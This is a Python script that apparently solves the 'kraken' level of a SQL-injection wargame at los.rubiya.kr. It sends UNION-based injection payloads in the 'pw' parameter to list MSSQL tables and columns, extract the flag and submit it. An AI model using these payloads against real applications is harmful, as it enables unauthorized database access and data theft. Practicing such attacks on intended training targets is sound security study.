import requests
import os
import re

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/kraken_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


res = requests.get(url, params={'pw': '\' union SELECT name FROM sysobjects WHERE xtype = \'U\' --'},cookies=cookie)

table_name = re.findall(r'<h2>(flag_.+)</h2>', res.text)[0]
print(f'table_name: {table_name}')

res = requests.get(url, params={'pw': f'\' union select object_id from sys.tables where name = \'{table_name}\' --'},cookies=cookie)
object_id = re.findall(r'<h2>(\d+)</h2>', res.text)[0]
print(f'object_id: {object_id}')

res = requests.get(url, params={'pw': f'\' union select name from sys.columns where object_id={object_id} --'},cookies=cookie)
column_name = re.findall(r'<h2>(.+)</h2>', res.text)[0]
print(f'column_name: {column_name}')

res = requests.get(url, params={'pw': f'\' union select {column_name} from {table_name} --'},cookies=cookie)
flag = re.findall(r'<h2>(.+)</h2>', res.text)[0]
print(f'flag: {flag}')
   
res = requests.get(url, params={'pw': flag},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
